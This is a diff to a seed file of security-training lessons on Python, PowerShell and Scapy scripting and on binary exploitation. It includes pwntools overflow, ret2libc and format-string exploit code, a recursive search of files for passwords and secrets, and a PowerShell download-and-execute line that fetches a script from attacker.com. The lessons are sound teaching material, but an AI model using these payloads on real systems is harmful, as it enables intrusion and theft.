@@ -25,13 +25,55 @@ export const SCRIPTING_BINEXP_ARTICLES: SeedArticle[] = [
       { heading: "Network scripting with Python", content: `\`\`\`python\nimport socket\n\n# TCP port scanner\ndef scan_port(host, port, timeout=1):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(timeout)\n    result = sock.connect_ex((host, port))\n    sock.close()\n    return result == 0\n\n# Banner grabbing\ndef grab_banner(host, port):\n    sock = socket.socket()\n    sock.settimeout(2)\n    sock.connect((host, port))\n    sock.send(b"HEAD / HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n")\n    banner = sock.recv(1024).decode(errors="ignore")\n    sock.close()\n    return banner\n\n# DNS resolution\nimport dns.resolver\nfor qtype in ["A", "AAAA", "MX", "NS", "TXT"]:\n    try:\n        answers = dns.resolver.resolve("target.com", qtype)\n        for rdata in answers:\n            print(f"{qtype}: {rdata}")\n    except dns.resolver.NoAnswer:\n        pass\n\n# Concurrent scanning with ThreadPoolExecutor\nfrom concurrent.futures import ThreadPoolExecutor\nwith ThreadPoolExecutor(max_workers=100) as executor:\n    futures = {executor.submit(scan_port, host, p): p\n               for p in range(1, 1025)}\n    for future in futures:\n        if future.result():\n            print(f"Port {futures[future]} open")\n\`\`\``, sortOrder: 0 },
       { heading: "Web interaction and scraping", content: `\`\`\`python\nimport requests\nfrom bs4 import BeautifulSoup\n\n# Session handling (preserves cookies)\nsession = requests.Session()\nsession.post("http://target.com/login",\n             data={"user": "admin", "pass": "admin"})\n\n# Authenticated request\nresp = session.get("http://target.com/dashboard")\n\n# Parse HTML\nsoup = BeautifulSoup(resp.text, "html.parser")\nfor link in soup.find_all("a", href=True):\n    print(link["href"])\n\n# Directory brute force\nwith open("/usr/share/wordlists/dirb/common.txt") as f:\n    for word in f:\n        url = f"http://target.com/{word.strip()}"\n        r = requests.get(url)\n        if r.status_code != 404:\n            print(f"[{r.status_code}] {url}")\n\n# Interact with APIs\nheaders = {"Authorization": "Bearer TOKEN"}\nresp = requests.get("http://target.com/api/v1/users",\n                    headers=headers)\nfor user in resp.json()["data"]:\n    print(f"ID: {user['id']}, Role: {user['role']}")\n\`\`\``, sortOrder: 1 },
       { heading: "PowerShell for Windows security", content: `\`\`\`powershell\n# System enumeration\nGet-ComputerInfo | Select-Object CsName, OsName, OsArchitecture\nGet-LocalUser | Where-Object Enabled -eq $true\nGet-Process | Sort-Object CPU -Descending | Select-Object -First 10\nGet-NetTCPConnection -State Listen\n\n# Active Directory queries (RSAT or domain-joined)\nGet-ADUser -Filter * -Properties LastLogonDate |\n  Where-Object { $_.LastLogonDate -lt (Get-Date).AddDays(-90) } |\n  Select-Object Name, LastLogonDate\n\nGet-ADGroupMember "Domain Admins" | Select-Object Name, SamAccountName\n\n# File searching\nGet-ChildItem -Path C:\\ -Recurse -Include *.txt,*.ini,*.config -ErrorAction SilentlyContinue |\n  Select-String -Pattern "password|secret|key" |\n  Select-Object Path, LineNumber, Line\n\n# Download and execute (common in post-exploitation)\nIEX (New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")\n# Or with Invoke-WebRequest\nInvoke-WebRequest -Uri "http://attacker.com/tool.exe" -OutFile "C:\\temp\\tool.exe"\n\`\`\``, sortOrder: 2 },
-      { heading: "Sources", content: `- Python socket module documentation\n- requests library: docs.python-requests.org\n- PowerShell documentation: learn.microsoft.com/en-us/powershell\n- Beautiful Soup: crummy.com/software/BeautifulSoup/bs4/doc`, sortOrder: 3 },
+      { heading: "Introduction to security-specific scripting frameworks", content: `Two Python libraries dominate security scripting beyond general-purpose tools. Understanding what they do and when to reach for them bridges the gap between general scripting and exploit/network engineering.
+
+**pwntools** — a Python framework for exploit development and CTF challenges. It handles the tedious parts of interacting with binaries: connecting to remote services, sending and receiving data with precise control, packing integers into the little-endian byte format that x86 expects, and building exploit payloads.
+
+\`\`\`python
+from pwn import *
+
+# Connect to a service and interact
+io = remote("target.com", 1337)
+io.recvuntil(b"Enter name: ")
+io.sendline(b"admin")
+response = io.recvline()
+print(response)
+io.close()
+
+# p64 packs a 64-bit integer into 8 bytes, little-endian
+# This is essential because x86-64 stores values in little-endian order
+addr = 0xdeadbeef
+packed = p64(addr)  # b'\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00'
+\`\`\`
+
+**Scapy** — a Python framework for crafting, sending, and analyzing network packets. It lets you build packets layer by layer and interact with the network at a level below what \`socket\` provides.
+
+\`\`\`python
+from scapy.all import *
+
+# Craft and send a single ICMP ping
+pkt = IP(dst="192.168.1.1") / ICMP()
+reply = sr1(pkt, timeout=2, verbose=0)
+if reply:
+    print(f"Reply from {reply[IP].src}")
+
+# ARP scan a subnet
+ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24"),
+             timeout=2, verbose=0)
+for _, received in ans:
+    print(f"{received[ARP].psrc} is at {received[Ether].src}")
+\`\`\`
+
+The next resource uses these frameworks for more advanced tasks — exploit scripting with pwntools (which requires understanding buffer overflows from the *Binary Exploitation* competency) and advanced packet crafting with Scapy.`, sortOrder: 3 },
+      { heading: "Sources", content: `- Python socket module documentation\n- requests library: docs.python-requests.org\n- PowerShell documentation: learn.microsoft.com/en-us/powershell\n- Beautiful Soup: crummy.com/software/BeautifulSoup/bs4/doc`, sortOrder: 4 },
     ],
   },
   {
     competencyId: "scripting", depthTier: 3, title: "Advanced Security Scripting", recommendedLevel: 3,
     sections: [
-      { heading: "Exploit scripting with pwntools", content: `\`\`\`python\nfrom pwn import *\n\n# Connect to a remote service\nio = remote("target.com", 1337)\n# Or local binary\nio = process("./vulnerable_binary")\n\n# Receive until prompt, then send\nio.recvuntil(b"Enter name: ")\nio.sendline(b"admin")\n\n# Craft payloads\npayload = b"A" * 64           # buffer overflow padding\npayload += p64(0xdeadbeef)     # overwrite return address (little-endian)\nio.sendline(payload)\n\n# Interact manually after exploit\nio.interactive()\n\n# Shellcode\ncontext.arch = "amd64"\nshellcode = asm(shellcraft.sh())  # /bin/sh shellcode\n\n# Format string exploit helper\npayload = fmtstr_payload(offset, {target_addr: desired_value})\n\n# ROP chain building\nelf = ELF("./binary")\nrop = ROP(elf)\nrop.call("system", [next(elf.search(b"/bin/sh"))])\n\`\`\``, sortOrder: 0 },
+      { heading: "Exploit scripting with pwntools", content: `> **Prerequisite concepts** (covered in depth in *Binary Exploitation L1-L2*): this section builds exploit payloads using pwntools. A **buffer overflow** writes past a buffer's boundary to overwrite the **return address** — the address the CPU jumps to when a function returns. By controlling this address, you redirect execution to a function or gadget of your choice. **ROP (Return-Oriented Programming)** chains small existing code snippets ("gadgets") ending in \`ret\` to bypass non-executable stack protections. \`p64(addr)\` packs an address into 8 little-endian bytes for x86-64.
+
+\`\`\`python\nfrom pwn import *\n\n# Connect to a remote service\nio = remote("target.com", 1337)\n# Or local binary\nio = process("./vulnerable_binary")\n\n# Receive until prompt, then send\nio.recvuntil(b"Enter name: ")\nio.sendline(b"admin")\n\n# Craft payloads\npayload = b"A" * 64           # buffer overflow padding\npayload += p64(0xdeadbeef)     # overwrite return address (little-endian)\nio.sendline(payload)\n\n# Interact manually after exploit\nio.interactive()\n\n# Shellcode\ncontext.arch = "amd64"\nshellcode = asm(shellcraft.sh())  # /bin/sh shellcode\n\n# Format string exploit helper\npayload = fmtstr_payload(offset, {target_addr: desired_value})\n\n# ROP chain building\nelf = ELF("./binary")\nrop = ROP(elf)\nrop.call("system", [next(elf.search(b"/bin/sh"))])\n\`\`\``, sortOrder: 0 },
       { heading: "Scapy for packet crafting", content: `\`\`\`python\nfrom scapy.all import *\n\n# Craft and send packets\n# SYN scan\nans, unans = sr(IP(dst="192.168.1.1")/TCP(dport=[80,443,8080], flags="S"),\n               timeout=2, verbose=0)\nfor sent, received in ans:\n    if received.haslayer(TCP) and received[TCP].flags == 0x12:  # SYN-ACK\n        print(f"Port {sent[TCP].dport} is open")\n\n# ARP scan\nans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),\n             timeout=2, verbose=0)\nfor _, received in ans:\n    print(f"{received[ARP].psrc} -> {received[Ether].src}")\n\n# DNS query\nans = sr1(IP(dst="8.8.8.8")/UDP()/DNS(rd=1, qd=DNSQR(qname="target.com")),\n          verbose=0)\nfor i in range(ans[DNS].ancount):\n    print(ans[DNS].an[i].rdata)\n\n# Packet sniffing with filter\ndef callback(pkt):\n    if pkt.haslayer(TCP) and pkt[TCP].flags & 0x02:  # SYN\n        print(f"SYN: {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")\n\nsniff(filter="tcp", prn=callback, count=100)\n\`\`\``, sortOrder: 1 },
       { heading: "Automation frameworks", content: `\`\`\`python\nimport argparse\nimport logging\nimport json\nfrom pathlib import Path\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\n\n# Structured CLI tool pattern\ndef main():\n    parser = argparse.ArgumentParser(description="Network scanner")\n    parser.add_argument("target", help="Target IP or CIDR")\n    parser.add_argument("-p", "--ports", default="1-1024", help="Port range")\n    parser.add_argument("-t", "--threads", type=int, default=50)\n    parser.add_argument("-o", "--output", type=Path, help="JSON output file")\n    parser.add_argument("-v", "--verbose", action="store_true")\n    args = parser.parse_args()\n\n    logging.basicConfig(\n        level=logging.DEBUG if args.verbose else logging.INFO,\n        format="%(asctime)s [%(levelname)s] %(message)s"\n    )\n\n    results = []\n    start, end = map(int, args.ports.split("-"))\n\n    with ThreadPoolExecutor(max_workers=args.threads) as pool:\n        futures = {pool.submit(scan_port, args.target, p): p\n                   for p in range(start, end + 1)}\n        for future in as_completed(futures):\n            port = futures[future]\n            if future.result():\n                logging.info(f"Port {port} open")\n                results.append({"port": port, "state": "open"})\n\n    if args.output:\n        args.output.write_text(json.dumps(results, indent=2))\n        logging.info(f"Results saved to {args.output}")\n\nif __name__ == "__main__":\n    main()\n\`\`\``, sortOrder: 2 },
       { heading: "Sources", content: `- pwntools documentation: docs.pwntools.com\n- Scapy documentation: scapy.readthedocs.io\n- Python argparse documentation\n- OJ Reeves, "Building Penetration Testing Tools with Python"`, sortOrder: 3 },
@@ -72,7 +114,24 @@ export const SCRIPTING_BINEXP_ARTICLES: SeedArticle[] = [
       { heading: "x86-64 assembly essentials", content: `\`\`\`nasm\n; Registers (64-bit)\n; rax, rbx, rcx, rdx — general purpose\n; rdi, rsi — first/second argument (System V AMD64 ABI)\n; rsp — stack pointer (top of stack)\n; rbp — base pointer (stack frame base)\n; rip — instruction pointer (next instruction)\n\n; System V AMD64 calling convention (Linux)\n; Arguments: rdi, rsi, rdx, rcx, r8, r9 (then stack)\n; Return value: rax\n; Caller-saved: rax, rcx, rdx, rsi, rdi, r8-r11\n; Callee-saved: rbx, rbp, r12-r15\n\n; Common instructions\nmov rax, rbx      ; rax = rbx\npush rax           ; push rax onto stack, rsp -= 8\npop rbx            ; pop into rbx, rsp += 8\ncall func          ; push rip, jump to func\nret                ; pop rip (return)\nlea rax, [rbp-0x20] ; load address, not value\ncmp rax, 0         ; compare\njne label          ; jump if not equal\nsyscall            ; invoke system call\n\`\`\``, sortOrder: 0 },
       { heading: "Stack buffer overflow", content: `The classic vulnerability:\n\n\`\`\`c\n#include <stdio.h>\nvoid vulnerable() {\n    char buffer[64];\n    gets(buffer);  // No bounds checking — reads until newline\n    // Stack layout (high → low):\n    // [return address] [saved rbp] [buffer (64 bytes)]\n    // Overflow buffer → overwrite saved rbp → overwrite return address\n}\n\nvoid win() {\n    system("/bin/sh");\n}\n\nint main() {\n    vulnerable();\n    return 0;\n}\n\`\`\`\n\n\`\`\`python\nfrom pwn import *\n\nio = process("./vuln")\n\n# Find offset to return address\n# cyclic(100) generates a pattern; cyclic_find() finds the offset\n# Or: gdb → run → input cyclic pattern → check RSP value\noffset = 72  # 64 (buffer) + 8 (saved rbp)\n\nelf = ELF("./vuln")\npayload = b"A" * offset\npayload += p64(elf.symbols["win"])  # overwrite return address with win()\n\nio.sendline(payload)\nio.interactive()  # should get a shell\n\`\`\``, sortOrder: 1 },
       { heading: "Using GDB for debugging", content: `\`\`\`bash\n# Start with GDB + pwndbg (or GEF/peda)\ngdb ./binary\n\n# Essential commands\nb main              # breakpoint at main\nb *0x401234         # breakpoint at address\nr                   # run\nr < input.txt       # run with input from file\nni                  # next instruction (step over)\nsi                  # step instruction (step into)\nc                   # continue\n\n# Examine memory\nx/20wx $rsp         # 20 words (4 bytes) at stack pointer, hex\nx/s 0x404040        # string at address\nx/10i $rip          # 10 instructions at instruction pointer\n\n# Info\ninfo registers      # all registers\ninfo frame          # stack frame info\nvmmap               # memory mappings (pwndbg)\nchecksec            # security mitigations (pwndbg)\n\n# Pattern for finding offset\npwndbg> cyclic 100  # generate pattern\npwndbg> cyclic -l 0x61616166  # find offset of value in RSP\n\`\`\``, sortOrder: 2 },
-      { heading: "Sources", content: `- guyinatuxedo.github.io/index.html (Nightmare — binary exploitation course)\n- pwn.college (ASU course)\n- pwndbg: github.com/pwndbg/pwndbg\n- GEF: github.com/hugsy/gef`, sortOrder: 3 },
+      { heading: "What happens when the stack is protected", content: `The basic stack overflow above worked because the program had no modern protections. Real-world binaries use multiple defenses that prevent the simple "inject shellcode → jump to it" approach:
+
+**NX / DEP (Non-Executable stack):** The operating system marks the stack as non-executable. Even if you overflow the buffer and write shellcode onto the stack, the CPU refuses to execute it — any attempt triggers a segfault. This is enabled by default on all modern systems.
+
+**Why this matters for your next step:** Since you can no longer place executable code on the stack, you need a different strategy. The key insight is that while you cannot *execute* data you placed on the stack, you can still *control the return address*. This leads to **Return-Oriented Programming (ROP)** — instead of jumping to shellcode, you chain together small snippets of existing executable code (called "gadgets") that end with \`ret\`. Each gadget does one small thing (pop a value into a register, call a function), and by placing their addresses on the stack in sequence, you build a full exploit from code that is already marked executable.
+
+**ASLR (Address Space Layout Randomization):** The OS loads libraries, the stack, and the heap at random addresses every time the program runs. You cannot hardcode addresses like \`0x7ffff7e12345\` in your exploit because they change. Bypassing ASLR requires **leaking** an address at runtime — for example, using a format string or a function like \`puts\` to print a known function's address, then calculating the library's base address from it.
+
+**Stack canaries:** A random value placed between your buffer and the saved return address. Before the function returns, it checks whether the canary was modified. If it was, the program aborts instead of using the corrupted return address. Bypassing canaries requires either leaking the canary value (e.g., via a format string) or exploiting a vulnerability that does not overwrite the canary (e.g., a write-what-where primitive).
+
+\`\`\`bash
+# Check which protections are enabled
+checksec --file=./binary
+# Canary: yes/no, NX: yes/no, PIE: yes/no, RELRO: partial/full
+\`\`\`
+
+The next resource teaches you how to bypass NX using ROP, and how to leak addresses to defeat ASLR.`, sortOrder: 3 },
+      { heading: "Sources", content: `- guyinatuxedo.github.io/index.html (Nightmare — binary exploitation course)\n- pwn.college (ASU course)\n- pwndbg: github.com/pwndbg/pwndbg\n- GEF: github.com/hugsy/gef`, sortOrder: 4 },
     ],
   },
   {
@@ -80,7 +139,37 @@ export const SCRIPTING_BINEXP_ARTICLES: SeedArticle[] = [
     sections: [
       { heading: "Bypassing NX with Return-Oriented Programming", content: `When the stack is non-executable (NX/DEP), you can't run shellcode directly. Instead, chain existing code snippets ("gadgets"):\n\n\`\`\`python\nfrom pwn import *\n\nelf = ELF("./binary")\nlibc = ELF("/lib/x86_64-linux-gnu/libc.so.6")\n\n# Find gadgets\n# ROPgadget --binary ./binary | grep "pop rdi"\nrop = ROP(elf)\n\n# ret2libc: call system("/bin/sh")\n# Need: pop rdi; ret gadget + address of "/bin/sh" + address of system()\npop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]\nret = rop.find_gadget(["ret"])[0]  # stack alignment\n\n# If ASLR is off or we have a libc leak:\nlibc_base = leaked_addr - libc.symbols["puts"]  # calculate base\nsystem = libc_base + libc.symbols["system"]\nbin_sh = libc_base + next(libc.search(b"/bin/sh"))\n\npayload = b"A" * offset\npayload += p64(ret)       # align stack to 16 bytes (required for system)\npayload += p64(pop_rdi)   # pop next value into rdi\npayload += p64(bin_sh)    # address of "/bin/sh" string\npayload += p64(system)    # call system("/bin/sh")\n\`\`\``, sortOrder: 0 },
       { heading: "Format string vulnerabilities", content: `\`\`\`c\n#include <stdio.h>\nvoid vulnerable(char *input) {\n    printf(input);  // Should be printf("%s", input)\n    // If input = "%x %x %x" → leaks stack values\n    // If input = "%n" → writes to memory\n}\n\`\`\`\n\n\`\`\`python\nfrom pwn import *\n\n# Read from arbitrary address\n# %s reads a string from the address at that stack position\n# First, find our input on the stack:\n# Send "AAAA.%x.%x.%x.%x.%x..." and look for 0x41414141\n\nio = process("./fmtstr")\n\n# Overwrite GOT entry with format string\n# pwntools makes this easy\nelf = ELF("./fmtstr")\n\n# Write address of win() to GOT entry of exit()\npayload = fmtstr_payload(\n    offset=6,  # our input starts at stack position 6\n    writes={elf.got["exit"]: elf.symbols["win"]},\n    write_size="short"  # use %hn (2 bytes at a time)\n)\nio.sendline(payload)\n\`\`\``, sortOrder: 1 },
-      { heading: "Reverse engineering basics", content: `\`\`\`bash\n# Static analysis\nfile binary\nchecksec binary  # NX, canary, PIE, RELRO\n\n# Disassembly\nobjdump -d binary | less\nobjdump -M intel -d binary  # Intel syntax\n\n# Strings\nstrings binary\nstrings -n 8 binary  # minimum length 8\n\n# Ghidra (decompiler)\n# Analyze → Auto Analysis → check all\n# Window → Decompile to see pseudo-C\n# Key shortcuts:\n# L → rename variable/function\n# T → retype variable\n# ; → add comment\n\n# radare2\nr2 binary\naaa          # analyze all\nafl          # list functions\npdf @main    # disassemble main\nVV @main     # visual graph mode\n\`\`\``, sortOrder: 2 },
+      { heading: "Reverse engineering basics", content: `> For comprehensive reverse engineering instruction (Ghidra, x64dbg, control flow analysis, malware unpacking), see the *Reverse Engineering* competency. This section focuses specifically on using RE tools to find exploitable targets and locate gadgets.
+
+\`\`\`bash
+# Step 1: Identify the binary and its protections
+file binary           # architecture, linking
+checksec binary       # NX, canary, PIE, RELRO — determines attack strategy
+
+# Step 2: Find interesting functions
+objdump -t binary | grep -i 'win\\|shell\\|flag\\|system'  # look for win functions
+objdump -R binary     # GOT entries — targets for overwrite (if partial RELRO)
+nm binary             # symbol table (if not stripped)
+
+# Step 3: Identify vulnerability in decompiled code
+# Ghidra: import → auto analysis → navigate to main/vulnerable function
+# Look for: gets(), strcpy(), sprintf(), scanf("%s"), read() with large size
+# Check buffer sizes vs input sizes in the decompiler output
+
+# Step 4: Measure buffer layout
+# Ghidra decompiler shows local variable offsets: char buf [64] at [RBP - 0x50]
+# Offset to saved RBP = 0x50, to return address = 0x50 + 8 = 88 bytes
+
+# Step 5: Find ROP gadgets
+ROPgadget --binary binary | grep "pop rdi"   # argument control
+ROPgadget --binary binary | grep "pop rsi"   # second argument
+ROPgadget --binary binary | grep ": ret$"    # stack alignment
+ROPgadget --binary binary --ropchain         # auto-generate a chain
+
+# Step 6: Examine libc for ret2libc
+strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"  # find /bin/sh string
+readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system         # find system() offset
+\`\`\``, sortOrder: 2 },
       { heading: "Security mitigations summary", content: `\`\`\`\n┌──────────────┬─────────────────────────────────────┬──────────────────────────────┐\n│ Mitigation   │ What it prevents                    │ Bypass technique             │\n├──────────────┼─────────────────────────────────────┼──────────────────────────────┤\n│ NX/DEP       │ Executing code on the stack         │ ROP, ret2libc                │\n│ ASLR         │ Predictable addresses               │ Info leak, brute force       │\n│ Stack canary │ Buffer overflow detection            │ Leak canary, format string   │\n│ PIE          │ Predictable code addresses           │ Info leak (code address)     │\n│ Full RELRO   │ GOT overwrite                       │ ROP (bypass GOT entirely)    │\n│ Partial RELRO│ Nothing (GOT still writable)        │ GOT overwrite                │\n└──────────────┴─────────────────────────────────────┴──────────────────────────────┘\n\`\`\``, sortOrder: 3 },
       { heading: "Sources", content: `- ROPgadget: github.com/JonathanSalwan/ROPgadget\n- Ghidra: ghidra-sre.org\n- radare2: rada.re\n- OWASP Binary Exploitation guide`, sortOrder: 4 },
     ],
